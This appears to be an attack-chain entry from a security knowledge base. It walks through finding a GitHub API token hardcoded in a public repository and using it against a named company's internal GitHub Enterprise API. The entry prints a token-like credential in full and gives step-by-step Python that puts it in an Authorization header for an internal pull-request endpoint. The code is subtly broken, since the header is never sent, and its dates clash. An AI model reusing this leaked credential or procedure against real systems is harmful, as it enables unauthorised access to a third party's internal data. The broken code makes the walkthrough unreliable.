---
tags:
  - token-leak
  - github
  - api-token
  - information-disclosure
type: attack_chain
tools:
  - '[[tools/Firefox]]'
tactics:
  - '[[Discovery]]'
  - '[[Credential Access]]'
commands:
  - '[[commands/python-import-os]]'
  - '[[commands/python-import-requests]]'
  - '[[commands/python-import-sys]]'
  - '[[commands/python-set-pull-number]]'
  - '[[commands/python-construct-pull-url]]'
  - '[[commands/python-initialize-payload]]'
  - '[[commands/python-add-authorization-header]]'
  - '[[commands/python-print-payload]]'
  - '[[commands/python-requests-get]]'
platforms:
  - Web
  - GitHub Enterprise
complexity: low
procedures:
  - '[[procedures/Discover-Public-Repository-with-Leaked-Token]]'
  - '[[procedures/Extract-and-Validate-Leaked-GitHub-Token]]'
step_count: 2
techniques:
  - '[[File and Directory Discovery]]'
  - '[[Unsecured Credentials]]'
description: >-
  Multi-stage attack chain demonstrating the discovery and exploitation of a
  leaked GitHub API token in a public repository, potentially allowing
  unauthorized access to internal GitHub Enterprise resources.
skill_level: beginner
impact_level: high
id: 38142d4b-a172-49be-9ff8-2a244892c1a8
created_at: '2025-12-11T06:10:28.342Z'
updated_at: '2025-12-11T06:10:28.342Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0007]]'
  - '[[TA0006]]'
mitre_techniques:
  - '[[T1083]]'
  - '[[T1552]]'
---
# GitHub API Token Exposure in Public Repository Leading to Internal Access

Multi-stage attack chain demonstrating a complete workflow for discovering a leaked GitHub API token in a public repository and using it to access internal GitHub Enterprise API endpoints, such as pull requests, without additional authentication.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Beginner |
| Complexity | Low |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Discovery of Public Repo] --> B[Token Extraction and Validation]
    B --> C[Potential Unauthorized Access]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Firefox]]

### Target Environment

- Web-based GitHub repository
- GitHub Enterprise API
- Python environment with requests library

### Initial Access Requirements

- Public internet access
- No credentials required for initial discovery

## Detailed Attack Procedures

### Step 1: Discovery of Public Repository - [[procedures/Discover-Public-Repository-with-Leaked-Token]]

**Procedure**: [[procedures/Discover-Public-Repository-with-Leaked-Token]]

**Objective**: Locate a public GitHub repository containing sensitive code with a hardcoded API token.

**Expected Output**: Identification of the repository URL and the file containing the leaked token.

**Success Indicators**:
- Repository is publicly accessible
- File contains hardcoded sensitive information

First, access the public GitHub repository using a web browser like [[tools/Firefox]] to view the file at https://github.com/█████/leetcode/blob/0eec6434940a01e490d5eecea9baf4778836c54e/TopicMatch.py.

Scan the code for hardcoded tokens.

### Step 2: Token Extraction and Validation - [[procedures/Extract-and-Validate-Leaked-GitHub-Token]]

**Procedure**: [[procedures/Extract-and-Validate-Leaked-GitHub-Token]]

**Objective**: Extract the leaked token from the Python script and validate its use for accessing internal API endpoints.

**Expected Output**: Successful extraction of the token and demonstration of API access.

**Success Indicators**:
- Token is valid for API authentication
- API requests return internal data without additional auth

Execute the following Python code snippets to reconstruct the leaked script:

Use [[commands/python-import-os]] to import os:

```python
import os
```

Use [[commands/python-import-requests]] to import requests:

```python
import requests
```

Use [[commands/python-import-sys]] to import sys:

```python
import sys
```

Use [[commands/python-set-pull-number]] to set the pull number:

```python
pull_number = 76793
```

Use [[commands/python-construct-pull-url]] to construct the URL:

```python
pull_url = "https://github.sc-corp.net/api/v3/repos/Snapchat/android/pulls/" + str(pull_number)
```

Use [[commands/python-initialize-payload]] to initialize payload:

```python
payload = {}
```

Use [[commands/python-add-authorization-header]] to add authorization:

```python
payload["Authorization"] = "token " + "9db9ca3440e535d90408a32a9c03d415979da910"
```

Use [[commands/python-print-payload]] to print payload:

```python
print(payload)
```

Use [[commands/python-requests-get]] to make the GET request:

```python
r = requests.get(pull_url)
```

Validate by checking if the request succeeds in accessing the internal pull request.

## Attack Chain Summary

### Key Achievements

1. Discovery of leaked token in public code
2. Potential access to internal GitHub resources
3. Demonstration of information disclosure vulnerability

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Unsecured Credentials]]
- [[File and Directory Discovery]]

### MITRE ATT&CK Tactics

- [[Credential Access]]
- [[Discovery]]

*Last updated: 2023-10-01*
